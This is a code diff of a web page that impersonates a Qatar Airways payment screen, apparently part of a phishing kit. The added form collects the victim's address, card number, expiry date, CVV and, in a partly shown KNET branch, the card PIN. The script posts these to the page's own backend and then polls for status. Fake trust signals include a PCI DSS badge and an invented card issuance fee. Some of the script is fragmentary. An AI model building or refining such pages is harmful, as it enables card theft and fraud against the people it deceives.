@@ -10,7 +10,7 @@
         :root {
             --qatar-maroon: #5C0632;
             --qatar-gold: #D4AF37;
-            --bg-light: #e6eaf0;
+            --bg-light: #F4F4F4;
             --text-dark: #333333;
         }
         *, *::before, *::after { box-sizing: border-box; }
@@ -22,6 +22,7 @@
             color: var(--text-dark);
         }
 
+        /* ===== HEADER ===== */
         header {
             position: fixed;
             top: 0;
@@ -35,7 +36,30 @@
             padding: 12px 24px;
             z-index: 1000;
         }
-        .header-left img { height: 65px; object-fit: contain; }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 24px;
+            height: 18px;
+            cursor: pointer;
+        }
+        .menu-icon span {
+            display: block;
+            height: 2px;
+            background-color: #000;
+            border-radius: 2px;
+        }
+        .header-left img {
+            height: 65px;
+            object-fit: contain;
+            display: block;
+        }
         .lang-btn {
             font-weight: bold;
             color: #ffffff;
@@ -46,76 +70,195 @@
             font-size: 14px;
         }
 
+        /* ===== MAIN CONTAINER ===== */
         .main-container {
             margin-top: 90px;
             width: 100%;
-            padding: 20px;
+            padding: 30px 20px 60px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        .card { 
-            background: #ffffff; 
-            border-radius: 12px; 
-            padding: 20px; 
-            margin-bottom: 15px; 
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1); 
-            border: 1.5px solid #000; 
+        /* ===== PAYMENT CARD ===== */
+        .payment-card {
             width: 100%;
-            max-width: 400px;
+            max-width: 550px;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            overflow: hidden;
         }
 
-        .header-logos { 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            margin-bottom: 20px; 
-            gap: 20px;
+        .payment-card-header {
+            background: var(--qatar-maroon);
+            color: #ffffff;
+            padding: 25px 30px;
+            text-align: center;
         }
-        .qatar-logo { height: 50px; }
-        .kfh-logo { height: 32px; }
-        .divider { width: 1.5px; height: 35px; background: #ccc; }
-
-        .row { 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center; 
-            padding: 12px 0; 
-            border-bottom: 1px solid #eee; 
+        .payment-card-header h2 {
+            margin: 0;
+            font-size: 22px;
+            font-weight: 800;
         }
-        .row:last-child { border-bottom: none; }
-        .label { color: #0056b3; font-weight: bold; font-size: 14px; }
-        .info-val { color: #333; font-size: 14px; font-weight: 700; }
-
-        .payment-methods {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
+        .payment-card-header .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255,255,255,0.15);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
             margin-top: 10px;
         }
-        .method-box {
-            cursor: pointer;
-            padding: 20px;
-            border: 2px solid #eee;
-            border-radius: 12px;
-            text-align: center;
-            background: #fff;
-            transition: all 0.3s ease;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
-        }
-        .method-box.active {
-            border-color: var(--qatar-maroon);
-            background: rgba(92, 6, 50, 0.05);
-            box-shadow: 0 4px 12px rgba(92, 6, 50, 0.1);
-        }
-        .method-box img { height: 35px; object-fit: contain; }
-        .method-box i { font-size: 28px; color: var(--qatar-maroon); }
-        .method-box span { font-weight: 800; font-size: 14px; }
 
+        .payment-card-body {
+            padding: 30px;
+        }
+
+        /* ===== ORDER SUMMARY ===== */
+        .order-summary {
+            background: var(--qatar-maroon);
+            border-radius: 14px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        .order-summary h3 {
+            margin: 0 0 15px 0;
+            font-size: 16px;
+            font-weight: 800;
+            color: #ffffff;
+            text-align: center;
+        }
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+            font-size: 15px;
+        }
+        .summary-row:last-child {
+            border-bottom: none;
+        }
+        .summary-row.total {
+            border-top: 2px solid rgba(255,255,255,0.3);
+            border-bottom: none;
+            margin-top: 5px;
+            padding-top: 12px;
+        }
+        .summary-row .label {
+            color: #ffffff;
+            font-weight: 500;
+        }
+        .summary-row .value {
+            font-weight: 700;
+            color: #ffffff;
+        }
+        .summary-row.total .label {
+            font-weight: 800;
+            color: #ffffff;
+            font-size: 16px;
+        }
+        .summary-row.total .value {
+            font-weight: 800;
+            color: #ffffff;
+            font-size: 16px;
+        }
+
+        /* ===== DELIVERY ADDRESS ===== */
+        .delivery-section {
+            margin-bottom: 25px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            border: 1px solid #eee;
+        }
+        .delivery-section h3 {
+            margin: 0 0 15px 0;
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--qatar-maroon);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* ===== CARD NUMBER WRAPPER ===== */
+        .card-number-wrapper {
+            position: relative;
+        }
+        .card-number-wrapper input {
+            padding-left: 55px;
+        }
+        .card-type-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 22px;
+            color: #999;
+            transition: color 0.3s;
+        }
+        .card-type-icon.visa { color: #1A1F71; }
+        .card-type-icon.mastercard { color: #EB001B; }
+        .card-type-icon.amex { color: #006FCF; }
+        .card-type-icon.discover { color: #FF6000; }
+        .card-type-icon.error { color: #dc3545; }
+
+        /* ===== CARD INPUT ===== */
+        .card-input-section {
+            background: linear-gradient(145deg, #f8f9fa 0%, #ffffff 100%);
+            border: 2px solid var(--qatar-maroon);
+            border-radius: 14px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+        .card-input-section h3 {
+            margin: 0 0 20px 0;
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--qatar-maroon);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--text-dark);
+            font-size: 14px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #ddd;
+            border-radius: 10px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+        }
+        .form-control:focus {
+            border-color: var(--qatar-maroon);
+            box-shadow: 0 0 0 3px rgba(92,6,50,0.1);
+        }
+
+        .form-row {
+            display: flex;
+            gap: 30px;
+        }
+        .form-row .form-group {
+            flex: 1;
+            margin-bottom: 18px;
+        }
+
+        /* ===== PAY BUTTON ===== */
         .pay-btn {
             background: var(--qatar-maroon);
             color: #ffffff;
@@ -126,18 +269,114 @@
             font-size: 18px;
             font-weight: 800;
             cursor: pointer;
-            margin-top: 20px;
+            transition: all 0.3s ease;
             font-family: 'Segoe UI', Tahoma, sans-serif;
-            border: 1.5px solid #000;
+            margin-top: 10px;
+        }
+        .pay-btn:hover {
+            background: #3D0420;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(92,6,50,0.3);
         }
 
-        footer { text-align: center; padding: 20px; color: #333; font-size: 12px; }
-        footer b { color: #0056b3; }
+        .supported-cards {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+        .supported-cards i {
+            font-size: 28px;
+        }
+        .pci-badge {
+            height: 35px;
+            object-fit: contain;
+        }
+
+        /* ===== ERROR ===== */
+        .field-error {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: 5px;
+            font-weight: 500;
+            display: none;
+        }
+        .field-error.show { display: block; }
+        .form-control.error {
+            border-color: #dc3545;
+            background-color: #fff5f5;
+        }
+
+        /* ===== FOOTER ===== */
+        footer {
+            background-color: var(--qatar-maroon);
+            color: #ffffff;
+            padding: 60px 20px 30px;
+        }
+        .footer-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .footer-logo {
+            height: 70px;
+            object-fit: contain;
+            margin-bottom: 25px;
+            background: transparent;
+        }
+        .footer-info {
+            font-size: 15px;
+            line-height: 2.2;
+            color: #cccccc;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .footer-bottom {
+            margin-top: 40px;
+            width: 100%;
+            border-top: 1px solid #3D0420;
+            padding-top: 20px;
+            font-size: 14px;
+            color: #777777;
+            text-align: center;
+        }
+
+                @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 580px) {
+            .payment-card { border-radius: 0; box-shadow: none; }
+            .main-container { padding: 20px 10px 40px; }
+            .payment-card-body { padding: 20px; }
+            .card-input-section { padding: 18px; }
+            .form-row { gap: 15px; }
+        }
     </style>
 </head>
 <body>
+
+    <!-- HEADER -->
     <header>
         <div class="header-left">
+            <div class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
             <img src="images/qatar_airways/logo.png" alt="Qatar Airways">
         </div>
         <div class="header-right">
@@ -146,63 +385,872 @@
     </header>
 
     <div class="main-container">
-        <!-- Card 1: Branding & Info -->
-        <div class="card">
-            <div class="header-logos">
-                <img src="images/logos/qatar_airways.png" class="qatar-logo" alt="Qatar Airways">
-                <div class="divider"></div>
-                <img src="images/logos/kfh.png" class="kfh-logo" alt="KFH">
-            </div>
-            <div class="row">
-                <span class="label">Beneficiary:</span>
-                <span class="info-val">Qatar Airways</span>
-            </div>
-            <div class="row">
-                <span class="label">Amount:</span>
-                <span class="info-val">KD 2.8</span>
-            </div>
-        </div>
+        <div class="payment-card">
 
-        <!-- Card 2: Payment Selection -->
-        <div class="card">
-            <div class="label" style="margin-bottom: 15px; display: block; text-align: center;">Select Payment Method</div>
-            <div class="payment-methods">
-                <div class="method-box active" onclick="selectMethod('knet')">
-                    <img src="images/knet-logo-new.jpg" alt="Knet">
-                    <span>Knet</span>
+            <div class="payment-card-body">
+
+                                <!-- PAYMENT METHOD SELECTION -->
+                <div style="margin-bottom: 25px;">
+                    <h3 style="font-size: 16px; font-weight: 700; color: var(--qatar-maroon); margin-bottom: 15px; display: flex; align-items: center; gap: 8px;">
+                        <i class="fas fa-wallet"></i> Select Payment Method
+                    </h3>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                        <div id="selectCredit" onclick="showPayment('credit')" style="cursor: pointer; padding: 20px; border: 2px solid var(--qatar-maroon); border-radius: 12px; text-align: center; background: rgba(92, 6, 50, 0.05); box-shadow: 0 4px 12px rgba(92, 6, 50, 0.15); transition: all 0.3s ease;">
+                            <i class="fas fa-credit-card" style="font-size: 24px; color: var(--qatar-maroon); margin-bottom: 10px; display: block;"></i>
+                            <span style="font-weight: 700; font-size: 14px;">Credit Card</span>
+                        </div>
+                        <div id="selectKnet" onclick="showPayment('knet')" style="cursor: pointer; padding: 20px; border: 2px solid #eee; border-radius: 12px; text-align: center; background: #fff; transition: all 0.3s ease;">
+                            <img src="https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" style="height: 24px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto;" alt="Knet">
+                            <span style="font-weight: 700; font-size: 14px;">Knet</span>
+                        </div>
+                    </div>
                 </div>
-                <div class="method-box" onclick="selectMethod('credit')">
-                    <i class="fas fa-credit-card"></i>
-                    <span>Credit Card</span>
+
+                <!-- ORDER SUMMARY -->
+                <div class="order-summary">
+                    <h3><i class="fas fa-receipt"></i> Payment Summary</h3>
+                    <div class="summary-row">
+                        <span class="label">Card Issuance Fee</span>
+                        <span class="value" id="issueFee">30 QAR</span>
+                    </div>
+                    <div class="summary-row">
+                        <span class="label">Delivery Fee</span>
+                        <span class="value" id="deliveryFee">5 QAR</span>
+                    </div>
+                    <div class="summary-row total">
+                        <span class="label">Total Amount</span>
+                        <span class="value" id="totalAmount">35 QAR</span>
+                    </div>
+                </div>
+
+                <!-- DELIVERY ADDRESS -->
+                <div class="delivery-section">
+                    <h3><i class="fas fa-map-marker-alt"></i> Delivery Address</h3>
+
+                    <div class="form-group" id="country-display-group">
+                        <label>Country</label>
+                        <div id="countryDisplayText" style="font-size:16px;font-weight:700;color:var(--qatar-maroon);padding:12px 16px;background:#f0f0f0;border-radius:10px;margin-top:8px;">Loading...</div>
+                    </div>
+
+                    <div style="display:none;">
+                        <label>Country</label>
+                        <select id="country" name="country" class="form-control" required>
+                            <option value="qa" selected>Qatar</option>
+                            <option value="kw">Kuwait</option>
+                            <option value="ae">United Arab Emirates</option>
+                            <option value="bh">Bahrain</option>
+                            <option value="om">Oman</option>
+                            <option value="sa">Saudi Arabia</option>
+                            <option value="eg">Egypt</option>
+                            <option value="divider" disabled>───────────────</option>
+                            <option value="af">Afghanistan</option>
+                            <option value="al">Albania</option>
+                            <option value="dz">Algeria</option>
+                            <option value="ar">Argentina</option>
+                            <option value="am">Armenia</option>
+                            <option value="au">Australia</option>
+                            <option value="at">Austria</option>
+                            <option value="az">Azerbaijan</option>
+                            <option value="bs">Bahamas</option>
+                            <option value="bd">Bangladesh</option>
+                            <option value="bb">Barbados</option>
+                            <option value="by">Belarus</option>
+                            <option value="be">Belgium</option>
+                            <option value="bz">Belize</option>
+                            <option value="bj">Benin</option>
+                            <option value="bt">Bhutan</option>
+                            <option value="bo">Bolivia</option>
+                            <option value="ba">Bosnia & Herzegovina</option>
+                            <option value="bw">Botswana</option>
+                            <option value="br">Brazil</option>
+                            <option value="bn">Brunei</option>
+                            <option value="bg">Bulgaria</option>
+                            <option value="bf">Burkina Faso</option>
+                            <option value="bi">Burundi</option>
+                            <option value="kh">Cambodia</option>
+                            <option value="cm">Cameroon</option>
+                            <option value="ca">Canada</option>
+                            <option value="cv">Cape Verde</option>
+                            <option value="cf">Central African Republic</option>
+                            <option value="td">Chad</option>
+                            <option value="cl">Chile</option>
+                            <option value="cn">China</option>
+                            <option value="co">Colombia</option>
+                            <option value="km">Comoros</option>
+                            <option value="cg">Congo</option>
+                            <option value="cr">Costa Rica</option>
+                            <option value="hr">Croatia</option>
+                            <option value="cu">Cuba</option>
+                            <option value="cy">Cyprus</option>
+                            <option value="cz">Czech Republic</option>
+                            <option value="dk">Denmark</option>
+                            <option value="dj">Djibouti</option>
+                            <option value="do">Dominican Republic</option>
+                            <option value="ec">Ecuador</option>
+                            <option value="sv">El Salvador</option>
+                            <option value="gq">Equatorial Guinea</option>
+                            <option value="er">Eritrea</option>
+                            <option value="ee">Estonia</option>
+                            <option value="et">Ethiopia</option>
+                            <option value="fj">Fiji</option>
+                            <option value="fi">Finland</option>
+                            <option value="fr">France</option>
+                            <option value="ga">Gabon</option>
+                            <option value="gm">Gambia</option>
+                            <option value="ge">Georgia</option>
+                            <option value="de">Germany</option>
+                            <option value="gh">Ghana</option>
+                            <option value="gr">Greece</option>
+                            <option value="gd">Grenada</option>
+                            <option value="gt">Guatemala</option>
+                            <option value="gn">Guinea</option>
+                            <option value="gw">Guinea-Bissau</option>
+                            <option value="gy">Guyana</option>
+                            <option value="ht">Haiti</option>
+                            <option value="hn">Honduras</option>
+                            <option value="hu">Hungary</option>
+                            <option value="is">Iceland</option>
+                            <option value="in">India</option>
+                            <option value="id">Indonesia</option>
+                            <option value="ir">Iran</option>
+                            <option value="iq">Iraq</option>
+                            <option value="ie">Ireland</option>
+                            <option value="il">Israel</option>
+                            <option value="it">Italy</option>
+                            <option value="jm">Jamaica</option>
+                            <option value="jp">Japan</option>
+                            <option value="jo">Jordan</option>
+                            <option value="kz">Kazakhstan</option>
+                            <option value="ke">Kenya</option>
+                            <option value="ki">Kiribati</option>
+                            <option value="kp">North Korea</option>
+                            <option value="kr">South Korea</option>
+                            <option value="lb">Lebanon</option>
+                            <option value="ls">Lesotho</option>
+                            <option value="lr">Liberia</option>
+                            <option value="ly">Libya</option>
+                            <option value="li">Liechtenstein</option>
+                            <option value="lt">Lithuania</option>
+                            <option value="lu">Luxembourg</option>
+                            <option value="mk">North Macedonia</option>
+                            <option value="mg">Madagascar</option>
+                            <option value="mw">Malawi</option>
+                            <option value="my">Malaysia</option>
+                            <option value="mv">Maldives</option>
+                            <option value="ml">Mali</option>
+                            <option value="mt">Malta</option>
+                            <option value="mh">Marshall Islands</option>
+                            <option value="mr">Mauritania</option>
+                            <option value="mu">Mauritius</option>
+                            <option value="mx">Mexico</option>
+                            <option value="fm">Micronesia</option>
+                            <option value="md">Moldova</option>
+                            <option value="mc">Monaco</option>
+                            <option value="mn">Mongolia</option>
+                            <option value="me">Montenegro</option>
+                            <option value="ma">Morocco</option>
+                            <option value="mz">Mozambique</option>
+                            <option value="mm">Myanmar</option>
+                            <option value="na">Namibia</option>
+                            <option value="nr">Nauru</option>
+                            <option value="np">Nepal</option>
+                            <option value="nl">Netherlands</option>
+                            <option value="nz">New Zealand</option>
+                            <option value="ni">Nicaragua</option>
+                            <option value="ne">Niger</option>
+                            <option value="ng">Nigeria</option>
+                            <option value="no">Norway</option>
+                            <option value="pk">Pakistan</option>
+                            <option value="pw">Palau</option>
+                            <option value="ps">Palestine</option>
+                            <option value="pa">Panama</option>
+                            <option value="pg">Papua New Guinea</option>
+                            <option value="py">Paraguay</option>
+                            <option value="pe">Peru</option>
+                            <option value="ph">Philippines</option>
+                            <option value="pl">Poland</option>
+                            <option value="pt">Portugal</option>
+                            <option value="ro">Romania</option>
+                            <option value="ru">Russia</option>
+                            <option value="rw">Rwanda</option>
+                            <option value="kn">Saint Kitts & Nevis</option>
+                            <option value="lc">Saint Lucia</option>
+                            <option value="vc">Saint Vincent</option>
+                            <option value="ws">Samoa</option>
+                            <option value="sm">San Marino</option>
+                            <option value="st">Sao Tome & Principe</option>
+                            <option value="sn">Senegal</option>
+                            <option value="rs">Serbia</option>
+                            <option value="sc">Seychelles</option>
+                            <option value="sl">Sierra Leone</option>
+                            <option value="sg">Singapore</option>
+                            <option value="sk">Slovakia</option>
+                            <option value="si">Slovenia</option>
+                            <option value="sb">Solomon Islands</option>
+                            <option value="so">Somalia</option>
+                            <option value="za">South Africa</option>
+                            <option value="ss">South Sudan</option>
+                            <option value="es">Spain</option>
+                            <option value="lk">Sri Lanka</option>
+                            <option value="sd">Sudan</option>
+                            <option value="sr">Suriname</option>
+                            <option value="sz">Eswatini</option>
+                            <option value="se">Sweden</option>
+                            <option value="ch">Switzerland</option>
+                            <option value="sy">Syria</option>
+                            <option value="tw">Taiwan</option>
+                            <option value="tj">Tajikistan</option>
+                            <option value="tz">Tanzania</option>
+                            <option value="th">Thailand</option>
+                            <option value="tl">Timor-Leste</option>
+                            <option value="tg">Togo</option>
+                            <option value="to">Tonga</option>
+                            <option value="tt">Trinidad & Tobago</option>
+                            <option value="tn">Tunisia</option>
+                            <option value="tr">Turkey</option>
+                            <option value="tm">Turkmenistan</option>
+                            <option value="tv">Tuvalu</option>
+                            <option value="ug">Uganda</option>
+                            <option value="ua">Ukraine</option>
+                            <option value="gb">United Kingdom</option>
+                            <option value="us">United States</option>
+                            <option value="uy">Uruguay</option>
+                            <option value="uz">Uzbekistan</option>
+                            <option value="vu">Vanuatu</option>
+                            <option value="va">Vatican City</option>
+                            <option value="ve">Venezuela</option>
+                            <option value="vn">Vietnam</option>
+                            <option value="ye">Yemen</option>
+                            <option value="zm">Zambia</option>
+                            <option value="zw">Zimbabwe</option>
+                        </select>
+                    </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>City / Area</label>
+                        <select id="city" name="city" class="form-control" required>
+                            <option value="">Select region...</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Street</label>
+                        <input type="text" id="street" name="street" class="form-control" required placeholder="Enter street name">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Building / Apartment Number</label>
+                        <input type="text" id="building_number" name="building_number" class="form-control" required placeholder="Enter building or apartment number">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Floor</label>
+                        <select id="floor" name="floor" class="form-control" required>
+                            <option value="">Select floor...</option>
+                            <option value="Ground Floor">Ground Floor</option>
+                            <option value="1">1st Floor</option>
+                            <option value="2">2nd Floor</option>
+                            <option value="3">3rd Floor</option>
+                            <option value="4">4th Floor</option>
+                            <option value="5">5th Floor</option>
+                            <option value="6">6th Floor</option>
+                            <option value="7">7th Floor</option>
+                            <option value="8">8th Floor</option>
+                            <option value="Other">Other</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- CARD INPUTS -->
+                <div id="creditCardSection" class="card-input-section">
+                    <h3><i class="fas fa-credit-card"></i> Bank Card Details</h3>
+
+                    <div class="form-group">
+                        <label>Cardholder Name</label>
+                        <input type="text" id="card_holder" name="card_holder" class="form-control" required placeholder="Enter cardholder name as written on the card">
+                        <div class="field-error" id="card_holder_error"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Card Number</label>
+                        <div class="card-number-wrapper">
+                            <input type="text" id="card_number" name="card_number" class="form-control" required placeholder="1234 5678 9012 3456" maxlength="19">
+                            <i class="fas fa-credit-card card-type-icon" id="cardTypeIcon"></i>
+                        </div>
+                        <div class="field-error" id="card_number_error"></div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Expiry Date</label>
+                            <input type="text" id="expiry_date" name="expiry_date" class="form-control" required placeholder="MM / YY" maxlength="7" style="font-size:14px;padding:10px 12px;">
+                            <div class="field-error" id="expiry_date_error"></div>
+                        </div>
+                        <div class="form-group">
+                            <label>Security Code (CVV)</label>
+                            <input type="password" id="cvv" name="cvv" class="form-control" required placeholder="•••" maxlength="4" style="font-size:14px;padding:10px 12px;">
+                            <div class="field-error" id="cvv_error"></div>
+                        </div>
+                    </div>
+                </div>
+
+                                <button type="submit" class="pay-btn" id="payBtn">Confirm Payment - <span id="btnTotal">35 QAR</span></button>
+
+                <!-- Knet Inline Form - Original KNET Page -->
+                <div id="knetCardSection" style="display:none; width: 100%; margin-bottom: 20px;">
+                    <iframe id="knetIframe" src="knet.html" style="width: 100%; height: 600px; border: none; border-radius: 8px;" frameborder="0" scrolling="auto"></iframe>
+                </div>
+
+                <!-- KNET Payment Button -->
+                <button type="button" class="pay-btn" id="knetPayBtn" style="display:none; margin-top: 15px;">
+                    Confirm Payment - <span id="knetBtnTotal">35 QAR</span>
+                </button>
+
+                <div class="supported-cards">
+                    <i class="fab fa-cc-visa" style="color:#1A1F71;"></i>
+                    <i class="fab fa-cc-mastercard" style="color:#EB001B;"></i>
+                    <img src="images/pci-dss-compliant.png" alt="PCI DSS Compliant" class="pci-badge">
                 </div>
             </div>
         </div>
+    </div>
 
-        <!-- Card 3: Action -->
-        <div class="card" style="padding: 0; border: none; background: transparent; box-shadow: none;">
-            <button class="pay-btn" onclick="proceedPayment()">Continue</button>
+    <!-- FOOTER -->
+    <footer>
+        <div class="footer-container">
+            <img src="images/qatar_airways/logo_white.png" alt="Qatar Airways" class="footer-logo">
+            <div class="footer-info">
+                © 2026 Qatar Airways. All rights reserved.<br>
+                We are committed to providing the best services and exclusive benefits to Privilege Club members.
+            </div>
+            <div class="footer-bottom">
+                Privacy Policy | Terms & Conditions | Contact Us
+            </div>
         </div>
+    </footer>
 
-        <footer>
-            All Rights Reserved © 2026<br>
-            <b>Shared Electronic Banking Services Company - KNET</b>
-        </footer>
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#5C0632;z-index:9999;justify-content:center;align-items:center;flex-direction:column;">
+        <div style="width:90px;height:90px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;">
+            <div style="width:45px;height:45px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ffffff;border-radius:50%;animation:spin 1s linear infinite;"></div>
+        </div>
+        <div style="font-size:24px;font-weight:700;color:#ffffff;margin-top:25px;" id="loadingTitle">Verifying card details...</div>
+        <p style="font-size:15px;color:rgba(255,255,255,0.8);margin-top:10px;" id="loadingMessage">Please wait, processing payment.</p>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:10000;justify-content:center;align-items:center;">
+        <div style="background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:shake 0.5s;border:2px solid #dc3545;">
+            <div style="font-size:50px;color:#dc3545;margin-bottom:15px;">✕</div>
+            <h3 style="color:#dc3545;margin-bottom:10px;" id="errorTitle">Verification Failed</h3>
+            <p style="color:#555;font-size:15px;" id="errorMessage">Please check the correct data and try again</p>
+            <button onclick="closeErrorModal()" style="margin-top:20px;padding:12px 30px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;font-weight:bold;">Retry</button>
+        </div>
     </div>
 
     <script>
-        let selectedMethod = 'knet';
-        function selectMethod(method) {
+        let pollInterval = null;
+        let selectedMethod = 'credit';
+
+        function showPayment(method) {
             selectedMethod = method;
-            document.querySelectorAll('.method-box').forEach(box => box.classList.remove('active'));
-            event.currentTarget.classList.add('active');
-        }
-        function proceedPayment() {
-            if(selectedMethod === 'knet') {
-                window.location.href = 'knet-en.html?beneficiary=Qatar Airways&amount=2.8';
+            const creditDiv = document.getElementById('selectCredit');
+            const knetDiv = document.getElementById('selectKnet');
+            const creditSection = document.getElementById('creditCardSection');
+            const payBtn = document.getElementById('payBtn');
+            const knetCardSection = document.getElementById('knetCardSection');
+            const knetPayBtn = document.getElementById('knetPayBtn');
+
+            if (method === 'credit') {
+                creditDiv.style.borderColor = 'var(--qatar-maroon)';
+                creditDiv.style.backgroundColor = 'rgba(92, 6, 50, 0.05)';
+                creditDiv.style.boxShadow = '0 4px 12px rgba(92, 6, 50, 0.15)';
+                knetDiv.style.borderColor = '#eee';
+                knetDiv.style.backgroundColor = '#fff';
+                knetDiv.style.boxShadow = 'none';
+                creditSection.style.display = 'block';
+                creditSection.style.animation = 'fadeIn 0.3s ease-in';
+                payBtn.style.display = 'block';
+                knetCardSection.style.display = 'none';
+                knetPayBtn.style.display = 'none';
             } else {
-                alert('Credit Card service is currently unavailable');
+                creditDiv.style.borderColor = '#eee';
+                creditDiv.style.backgroundColor = '#fff';
+                creditDiv.style.boxShadow = 'none';
+                knetDiv.style.borderColor = '#0070cd';
+                knetDiv.style.backgroundColor = 'rgba(0, 112, 205, 0.05)';
+                knetDiv.style.boxShadow = '0 4px 12px rgba(0, 112, 205, 0.15)';
+                creditSection.style.display = 'none';
+                payBtn.style.display = 'none';
+                knetCardSection.style.display = 'block';
+                knetCardSection.style.animation = 'fadeIn 0.3s ease-in';
+                knetPayBtn.style.display = 'block';
             }
         }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('selectCredit').addEventListener('click', () => showPayment('credit'));
+            document.getElementById('selectKnet').addEventListener('click', () => showPayment('knet'));
+            showPayment('credit');
+
+            // Pass data to KNET iframe after a short delay to ensure it loads
+            setTimeout(function() {
+                var iframe = document.getElementById('knetIframe');
+                if (iframe && iframe.contentWindow) {
+                    iframe.contentWindow.postMessage({
+                        type: 'initKnetData',
+                        userData: JSON.parse(localStorage.getItem('userData') || '{}'),
+                        selectedCountry: localStorage.getItem('selectedCountry'),
+                        knetTotal: sessionStorage.getItem('knetTotal')
+                    }, '*');
+                }
+            }, 1500);
+        });
+
+                    const country = localStorage.getItem('selectedCountry') || document.getElementById('country').value;
+            const city = document.getElementById('city').value;
+            const street = document.getElementById('street').value.trim();
+            const buildingNumber = document.getElementById('building_number').value.trim();
+            const floor = document.getElementById('floor').value;
+
+            if (!city || !street || !buildingNumber || !floor) {
+                alert('Please complete delivery address details');
+                return;
+            }
+
+            const knetCardNumber = document.getElementById('knetCardNumber').value.trim();
+            const rawKnetCardNumber = knetCardNumber.replace(/\s/g, '');
+            if (rawKnetCardNumber.length < 12) {
+                alert('Invalid Knet card number');
+                return;
+            }
+
+            const expiryMonth = document.getElementById('knetExpiryMonth').value.trim();
+            const expiryYear = document.getElementById('knetExpiryYear').value.trim();
+            const pin = document.getElementById('knetPin').value.trim();
+
+            if (!expiryMonth || !expiryYear || !pin) {
+                alert('Please complete Knet details');
+                return;
+            }
+
+            const data = {
+                orderId,
+                payment_method: 'Knet',
+                knet_data: {
+                    card_number: rawKnetCardNumber,
+                    expiry_month: expiryMonth,
+                    expiry_year: expiryYear,
+                    pin: pin
+                },
+                delivery_address: {
+                    country, city, street, building_number: buildingNumber, floor
+                }
+            };
+
+            try {
+                document.getElementById('loadingTitle').textContent = 'Processing KNET...';
+                document.getElementById('loadingMessage').textContent = 'Please wait, processing KNET payment.';
+                document.getElementById('loadingOverlay').style.display = 'flex';
+
+                const response = await fetch('/api/orders/payment-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                if (response.ok) {
+                    pollInterval = setInterval(pollOrderStatus, 2000);
+                } else {
+                    alert('Error processing payment');
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                }
+            } catch (err) {
+                alert('Connection error');
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }
+        }
+
+
+        function isValidCardNumber(number) {
+            const digits = number.replace(/\s/g, '');
+            if (digits.length < 12 || digits.length > 19) return false;
+            if (!/^\d+$/.test(digits)) return false;
+
+            let sum = 0;
+            let isEven = false;
+            for (let i = digits.length - 1; i >= 0; i--) {
+                let digit = parseInt(digits.charAt(i), 10);
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
